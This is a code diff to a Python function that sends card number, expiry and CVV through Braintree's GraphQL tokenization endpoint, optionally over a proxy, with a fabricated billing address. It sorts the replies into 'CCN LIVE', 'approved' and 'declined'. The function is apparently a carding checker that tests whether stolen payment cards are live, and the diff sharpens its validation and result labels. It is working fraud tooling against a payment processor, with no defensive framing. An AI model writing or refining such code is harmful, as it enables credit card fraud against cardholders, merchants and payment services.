@@ -124,7 +124,7 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
                 "response": f"Token Parse Failed: {str(e)[:30]}"
             }
         
-        # Step 3: Tokenize card via Braintree GraphQL
+        # Step 3: Tokenize card via Braintree GraphQL with CVV validation
         tokenize_payload = {
             "clientSdkMetadata": {
                 "source": "client",
@@ -158,9 +158,15 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
                         "expirationMonth": mes,
                         "expirationYear": f"20{ano}",
                         "cvv": cvv,
-                        "billingAddress": {"postalCode": "10001"}
+                        "billingAddress": {
+                            "postalCode": "10001",
+                            "streetAddress": "123 Main St",
+                            "locality": "New York",
+                            "region": "NY",
+                            "countryCodeAlpha2": "US"
+                        }
                     },
-                    "options": {"validate": False}
+                    "options": {"validate": True}
                 }
             },
             "operationName": "TokenizeCreditCard"
@@ -197,34 +203,53 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
             error_msg = data["errors"][0].get("message", "Unknown Error")
             error_upper = error_msg.upper()
             
-            # CVV/CVC validation errors indicate card is valid
-            if any(x in error_upper for x in ["CVV", "CVC", "SECURITY", "VERIFICATION"]):
+            # CVV/CVC validation errors indicate card is valid but wrong CVV
+            if any(x in error_upper for x in ["CVV", "CVC", "SECURITY CODE"]):
                 return {
-                    "status": "approved",
-                    "response": f"CVV_REQUIRED: {error_msg}"
+                    "status": "ccn",
+                    "response": f"CCN LIVE - Wrong CVV"
                 }
             
-            # Other errors
+            # Card validation failed - declined reasons
+            if any(x in error_upper for x in [
+                "DECLINED", "INVALID", "EXPIRED", "DO NOT HONOR",
+                "INSUFFICIENT", "LOST", "STOLEN", "FRAUD", "RESTRICTED",
+                "NOT PERMITTED", "PICKUP", "REVOKED"
+            ]):
+                return {
+                    "status": "declined",
+                    "response": f"Declined: {error_msg[:60]}"
+                }
+            
+            # Other validation errors
+            if any(x in error_upper for x in ["FAILED", "UNABLE", "CANNOT", "BLOCKED"]):
+                return {
+                    "status": "declined",
+                    "response": f"Validation Failed: {error_msg[:50]}"
+                }
+            
+            # Unknown error - treat as error
             return {
-                "status": "declined",
-                "response": error_msg
+                "status": "error",
+                "response": f"Error: {error_msg[:60]}"
             }
         
-        # Check for successful tokenization
+        # Check for successful tokenization with validation
         if "data" in data and data["data"].get("tokenizeCreditCard"):
             token_result = data["data"]["tokenizeCreditCard"]
             
             if token_result.get("token"):
-                # Card was tokenized successfully
+                # Card was tokenized successfully with validation
                 cc_info = token_result.get("creditCard", {})
                 bin_data = cc_info.get("binData", {})
                 
                 bank = bin_data.get("issuingBank", "Unknown")
                 country = bin_data.get("countryOfIssuance", "Unknown")
+                brand = cc_info.get("brandCode", "Unknown")
                 
                 return {
                     "status": "approved",
-                    "response": f"CVV_MATCHED ✓ Bank: {bank[:30]}"
+                    "response": f"CVV VALID ✓ | {brand} | {bank[:25]}"
                 }
             else:
                 return {
@@ -232,10 +257,10 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
                     "response": "Tokenization Failed"
                 }
         
-        # Default decline
+        # Default decline for unknown response
         return {
             "status": "declined",
-            "response": str(data)[:100]
+            "response": f"Unknown: {str(data)[:60]}"
         }
         
     except httpx.TimeoutException:
